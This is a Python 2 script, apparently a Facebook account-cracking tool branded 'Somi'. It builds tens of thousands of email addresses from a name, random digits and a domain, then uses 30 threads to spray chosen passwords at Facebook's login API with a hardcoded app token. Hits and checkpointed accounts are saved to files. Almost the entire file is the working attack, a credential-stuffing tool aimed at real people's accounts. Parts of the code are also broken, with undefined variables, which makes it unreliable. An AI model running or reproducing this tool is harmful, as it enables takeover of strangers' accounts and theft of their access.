import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):

    nmbr = random.randint(111, 999)
    sys.stdout = open('.txt', 'a')
    print (nmbr)
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Somi')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; BAH-W09 Build/HUAWEIBAH-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Safari/537.36 [FB_IAB/FB4A;FBAV/154.0.0.29.385;]')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B661094629A90240T1390849P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 8.0.0; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B667897245A77460T1297416P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 6.0.1; SM-J106H Build/MMB29Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 SamsungBrowser/CrossApp/0.1.90')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B673272004A48129T1390849P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 Mailbird/2.5.8.0/ Mailbird/2.5.8.0/')]
br.addheaders = [('user-agent', 'Millennium/20180228 CFNetwork/811.4.18 Darwin/16.5.0')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; VFD 610 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/162.0.0.45.94;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 5.0.2; VF-1497 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; BAH-W09 Build/HUAWEIBAH-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Safari/537.36 [FB_IAB/FB4A;FBAV/154.0.0.29.385;]')]


def exb():
    print '[!] Exit Successfully thank you Somi'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)

os.system("clear")
####LOGO####
logo = """
\033[1;92m _______  _______  _______ _________
\033[1;93m(  ____ \(  ___  )(       )\__   __/
\033[1;94m| (    \/| (   ) || () () |   ) (   
\033[1;93m| (_____ | |   | || || || |   | |   
\033[1;96m(_____  )| |   | || |(_)| |   | |   
\033[1;91m      ) || |   | || |   | |   | |   
\033[1;92m/\____) || (___) || )   ( |___) (___
\033[1;93m\_______)(_______)|/     \|\_______/

"""
logo1 = """
\033[1;92m _______  _______  _______ _________
\033[1;93m(  ____ \(  ___  )(       )\__   __/
\033[1;94m| (    \/| (   ) || () () |   ) (   
\033[1;93m| (_____ | |   | || || || |   | |   
\033[1;96m(_____  )| |   | || |(_)| |   | |   
\033[1;91m      ) || |   | || |   | |   | |   
\033[1;92m/\____) || (___) || )   ( |___) (___
\033[1;93m\_______)(_______)|/     \|\_______/
                      
                                                         
                                                         
"""
logo3 = """
\033[1;92m _______  _______  _______ _________
\033[1;93m(  ____ \(  ___  )(       )\__   __/
\033[1;94m| (    \/| (   ) || () () |   ) (   
\033[1;93m| (_____ | |   | || || || |   | |   
\033[1;96m(_____  )| |   | || |(_)| |   | |   
\033[1;91m      ) || |   | || |   | |   | |   
\033[1;92m/\____) || (___) || )   ( |___) (___
\033[1;93m\_______)(_______)|/     \|\_______/

"""
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []

def Somi():
    os.system('clear')
    print logo
    jalan('\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]  \x1b[1;96mSTART NEW SERIES')
    time.sleep(0.05)
    jalan('\x1b[1;96m[\x1b[1;92m00\x1b[1;96m]  \x1b[1;96mSTOP ')
    time.sleep(0.05)
    action()


def action():
    global cpb
    global oks
    Somi = raw_input('\n\x1b[1;91mChoose an Option>>> \x1b[1;95m')
    if Somi == '':
        print '[!] Fill in correctly'
        action()
    elif Somi == '1':
        print logo
        os.system('clear')
        jalan('Type Any Name Small Words first name and last name ]\n\x1b[1;93m[Example]  mohammad\n\x1b[1;93m[Example]  somi\n\x1b[1;95m\xc2\xab-----------------\x1b[1;91hacker\x1b[1;95m-----------------')
        
        try:
            k = raw_input('\x1b[1;95m Type Any Name  : ')
            print logo1
            c = raw_input('\x1b[1;95m Type Any Domin : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            Somi()

    elif Somi == '0':
        login()
    else:
        print '[!] Fill in correctly'
        action()
    print logo3
    Somi = raw_input('\x1b[1;93m Type Any Password No1: ')
    Somii = raw_input('\x1b[1;92m Type Any Password No2: ')
    Somiii = raw_input('\x1b[1;96m Type Any Password No3: ')
    xxx = str(len(id))
    jalan('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.05)
    jalan(' \x1b[1;93mPlz Wait Cloned Accounts Will Appear ')
    time.sleep(0.05)
    jalan('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.05)
    print 44 * '-'
    print logo
    
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = pak
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]  ' + k + user + c + '  ===  ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
                okb.close()
                oks.append(k + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[CP] ' + k + user + c + '  ===  ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
                cps.close()
                cpb.append(k + user + c + pass1)
            else:
                pass2 = malik
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[OK]  ' + k + user + c + '  ===  ' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
                    okb.close()
                    oks.append(k + user + c + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[CP] ' + k + user + c + '  ===  ' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass2 + '\n')
                    cps.close()
                    cpb.append(k + user + c + pass2)
                else:
                    pass3 = khan
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[OK]  ' + k + user + c + '  ===  ' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
                        okb.close()
                        oks.append(k + user + c + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[CP] ' + k + user + c + '  ===  ' + pass3 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass3 + '\n')
                        cps.close()
                        cpb.append(k + user + c + pass3)
                    else:
                        pass4 = k
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[OK]  ' + k + user + c + '  ===  ' + pass4 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
                            okb.close()
                            oks.append(k + user + c + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[CP] ' + k + user + c + '  ===  ' + pass4 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
                            cps.close()
                            cpb.append(k + user + c + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 44 * '-'
    print ' Process Has Been Completed ....'
    print 'Total OK\xe2\x88\x9a Email : ' + str(len(oks)) + '/' + str(len(cpb))
    print ' CP File Has Been Saved : save/checkpoint.txt'
    print 'WHtsApp.03455453538'


if __name__ == '__main__':
    Somi()
    
                                                         
                                                         
                                                         


